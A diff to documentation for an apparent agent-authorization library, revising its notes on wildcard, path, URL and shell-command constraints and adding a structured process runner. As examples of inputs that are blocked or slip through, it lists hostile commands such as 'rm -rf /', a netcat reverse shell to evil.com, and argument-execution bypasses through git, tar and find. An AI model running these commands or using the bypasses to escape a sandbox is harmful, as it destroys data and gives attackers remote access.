@@ -174,7 +174,9 @@ from tenuo import Pattern
 # Suffix wildcard - matches paths starting with /data/
 Pattern("/data/*")
 
-# Prefix wildcard - matches emails ending with @company.com
+# Prefix wildcard - matches any string ending with @company.com
+# Not for recipient fields: * also matches "," ";" "<" and "@", so
+# "eve@evil.com,bob@company.com" matches. Use an anchored Regex there.
 Pattern("*@company.com")
 
 # Middle wildcard - matches specific file in any subdirectory
@@ -490,7 +492,15 @@ Subpath("/data", allow_equal=False)     # Require strictly under root
 | `Subpath("/data")` | `/etc/passwd` | No |
 | `Subpath("/data")` | `data/file.txt` | No (relative path) |
 
-**Attenuation:** Child root must be contained within parent root.
+`Subpath.matches()` and warrant matching also accept a list of absolute path
+strings. Every item must match; mixed types and nested lists fail. Empty lists
+match, so executors must supply actual implicit paths when callers omit them
+(`tenuo.process` uses the working directory). `contains()` remains a scalar
+path check.
+
+**Attenuation:** Child root must be contained within parent root. A Subpath can
+also narrow to `Subset` of contained path strings or `Exact` of a contained path
+string/list. The same rules apply in Rust, Python, and TypeScript.
 
 ```python
 # Parent: /data
@@ -607,7 +617,7 @@ child = UrlSafe(block_private=False)  # FAILS
 > [!NOTE]
 > **DNS Resolution**
 >
-> This constraint does NOT perform DNS resolution. This is intentional - DNS resolution is I/O that can block, fail, or be manipulated (DNS rebinding). For DNS-aware validation, use `url_jail` at the execution layer.
+> This constraint does NOT perform DNS resolution. This is intentional - DNS resolution is I/O that can block, fail, or be manipulated (DNS rebinding). `UrlSafe` protects literal IPs and URL/host policy, but the HTTP execution layer must still validate every resolved address (including redirects) and connect to that validated address without resolving the hostname again. For Python, `url_jail` is one execution-layer option.
 
 > [!IMPORTANT]
 > **IPv6 Address Handling**
@@ -654,7 +664,10 @@ constraint.is_safe("not-a-url")  # False
 
 ### Shlex
 
-Validates that a shell command string is safe and simple. Ensures the command is a single executable with literal arguments, preventing shell injection.
+Checks a command string against a binary allowlist and a defined subset of POSIX
+shell syntax. Every SDK uses the same core tokenizer for matching, explanations,
+and attenuation. The check does not execute the command, resolve the executable,
+or identify the resources the program will access.
 
 ```python
 from tenuo import Shlex
@@ -665,10 +678,21 @@ constraint = Shlex(allow=["ls", "cat", "grep"])
 constraint.matches("ls -la /tmp")           # True
 constraint.matches("cat file.txt")          # True
 constraint.matches("ls -la; rm -rf /")      # False (operator blocked)
+constraint.matches('ls "foo; bar"')         # True (quoted semicolon is literal)
+Shlex(allow=["echo"]).matches('echo ";"')    # True (a quoted operator is an argument)
+constraint.matches("ls -la # note")         # True (literal # with no operators)
+constraint.matches("ls #; rm")              # False (# is a word character, so ; is still blocked)
+constraint.matches("ls foo#; rm -rf /")     # False (# inside a word does not hide ;)
+constraint.matches("./ls,evil -la")         # False (the command name is ./ls,evil)
 constraint.matches("echo $(whoami)")        # False (command substitution)
+constraint.matches('echo "$HOME"')          # False ($ expands inside double quotes)
 constraint.matches("ls $HOME")              # False (variable expansion)
 constraint.matches("rm -rf /")              # False (rm not in allowlist)
 ```
+
+`#` is an ordinary word character, never a comment, so an operator after `#` is still rejected. Each `allow` entry matches the command word literally: `allow=["ls"]` matches `ls` only (not `/usr/bin/ls`, `./ls`, or `/tmp/attacker/ls`), and any command word containing `..` is rejected.
+
+A quoted or backslash-escaped operator is a literal argument, so `find . -exec rm {} \;` passes this check. `find` still runs the argument. That is the semantic gap in the warning below. `Shlex.check(command)` returns the same decision the warrant uses, including the reason.
 
 **Security Features:**
 
@@ -685,22 +709,31 @@ constraint.matches("rm -rf /")              # False (rm not in allowlist)
 | Unauthorized binary | `nc -e /bin/sh evil.com` | Yes |
 
 > [!NOTE]
-> Glob characters (`*`, `?`, `[`) are allowed. They expand to filenames
-> but are not shell injection vectors. If you need to restrict file
-> access, combine `Shlex` with `Subpath`.
+> Glob characters (`*`, `?`, `[`) are literal arguments to this check. A
+> shell that runs the command may still expand them. Bash may also expand
+> `{a,b,c}`; this check keeps that as one word. If you need to restrict file
+> access, expose explicit path arguments checked with `Subpath` and execute the
+> checked values through a trusted runner.
 
 > [!WARNING]
-> **Tier 1 Mitigation Only**
+> **Syntax checks and execution**
 >
-> Shlex validates **shell syntax**, not **tool semantics**. Some tools interpret arguments as commands:
+> `Shlex` can be used in local policies and signed warrants. Its guarantee covers
+> command syntax and the command word; each program still interprets its own
+> arguments. Some tools interpret arguments as commands:
 >
 > ```python
 > # These pass Shlex but the tool executes the argument:
 > "git clone --upload-pack='malicious' repo"
 > "tar --checkpoint-action=exec=cmd -xf file.tar"
+> "find . -exec rm {} \\;"
 > ```
 >
-> For complete protection, use `proc_jail` which bypasses the shell entirely via `execve()`.
+> For tools that execute commands, prefer structured operations with explicit
+> flags, paths, and working directories, authorize those values, and execute
+> them without a shell. Program-specific execution profiles must account for
+> options and configuration that run other programs. Filesystem or process
+> isolation is needed when the program itself must be confined.
 
 > [!NOTE]
 > **Dangerous Binaries**
@@ -723,6 +756,70 @@ constraint.matches(None)  # False
 # Empty allowlist raises ValueError
 Shlex(allow=[])  # ValueError: Shlex requires at least one allowed binary
 ```
+
+
+#### Running the authorized command
+
+A check on a command string does not fix what runs: the shell expands braces,
+globs and `~` afterwards, and the program reads its own config. For agents that
+run commands, give the tool structured arguments and run them with
+`tenuo.process` (POSIX only):
+
+```python
+from tenuo import OneOf, Subpath, Subset, Warrant
+from tenuo.process import GIT, run, run_command
+
+warrant = (Warrant.mint_builder()
+    .capability("git",
+        subcommand=OneOf(["status", "diff", "log"]),
+        flags=Subset(["--short", "--stat", "--oneline"]),
+        paths=Subpath("/workspace/repo"),
+        cwd=Subpath("/workspace/repo"))
+    .holder(agent_key.public_key).ttl(1800).mint(issuer_key))
+bound = warrant.bind(agent_key)
+
+run(bound, GIT, subcommand="status", flags=["--short"], cwd="/workspace/repo")  # runs
+run(bound, GIT, subcommand="push", cwd="/workspace/repo")                      # AuthorizationDenied
+
+# A tool that takes one string: split once, run that split, never a shell.
+run_command(bound, GIT, "git log --oneline", cwd="/workspace/repo")
+run_command(bound, GIT, "git status && rm -rf ~", cwd="/workspace/repo")      # AuthorizationDenied
+```
+
+- `cwd` and each entry of `paths` (joined to `cwd`, defaulting to `"."` when
+  omitted) are resolved with `realpath` before the check, so a symlink cannot
+  lead outside the `Subpath`. Because `realpath` resolves paths before `execve`
+  rather than pinning file descriptors, the directory ancestry of `cwd` and
+  `paths` must not be writable by concurrent untrusted processes.
+- argv is exactly the checked values, with program-forced safety flags after
+  caller flags and paths after `--`. The environment is fixed by the `Program`;
+  nothing is inherited.
+- The `GIT` profile supports `status`, `diff`, and `log` and requires Git 2.41+.
+  SHA-1 and SHA-256 repositories use their own empty-tree attribute source.
+  This is the executor's supported grammar; the warrant must still authorize
+  every operation and argument. It stops repository config and
+  `.gitattributes` from running programs (`core.fsmonitor`, pagers, external
+  diff, textconv, filters), treats pathspecs literally
+  (`GIT_LITERAL_PATHSPECS=1`), and turns off network transports
+  (`GIT_ALLOW_PROTOCOL=""`). Keep `.git/` out of the agent's file tools, since
+  settings there still apply.
+- Delegation narrows each field: a smaller `OneOf` of subcommands, a smaller
+  `Subset` of flags, a deeper `Subpath`.
+- Other programs: `Program(name="rg", env={...})`. The profile only blocks
+  what it names, so check the program's own options that run code.
+
+The program profile is trusted application configuration. Its environment and
+forced options are copied at construction, and its executable is resolved once
+on first use. Keep the executable and its directory ancestry under trusted
+control. Agents supply the request, not the profile. `run_command` uses the
+shared core tokenizer's successful decision; no second shell parser or shell
+expansion runs between authorization and execution. Program profiles define
+execution semantics, while authorization continues to come from the warrant.
+
+For approval-gated calls, pass collected signed approvals with
+`run(..., approvals=[signed_approval])` (also supported by `run_command`).
+Approvals cover the resolved request, including absolute paths and working
+directory, and are verified by the ordinary warrant authorization path.
 
 ---
 
@@ -1761,7 +1858,8 @@ tools:
 
       environment:
         from: literal        # Static value
-        value: "production"
+        path: ""
+        default: "production"
 
 routes:
   - pattern: "/api/v1/clusters/{cluster}/scale"
@@ -1858,7 +1956,7 @@ routes:
 |-------|------|---------|-------------|
 | `warrant_header` | string | `X-Tenuo-Warrant` | HTTP header containing base64-encoded warrant or WarrantStack |
 | `pop_header` | string | `X-Tenuo-PoP` | HTTP header containing base64-encoded PoP signature |
-| `clock_tolerance_secs` | int | `30` | Seconds of tolerance for expiration checks |
+| `clock_tolerance_secs` | int | `30` | Future-issued timestamp tolerance; expiry is strict |
 | `trusted_roots` | list | `[]` | Hex-encoded public keys of trusted control planes |
 | `debug_mode` | bool | `false` | Enable detailed deny reasons in response headers |
 
@@ -1881,7 +1979,7 @@ routes:
   - pattern: "/api/v1/admin/{action}"
     method: ["POST"]
     tool: "admin_action"
-    extra_constraints:
+    constraints:
       admin_key:
         from: header
         path: "X-Admin-Key"
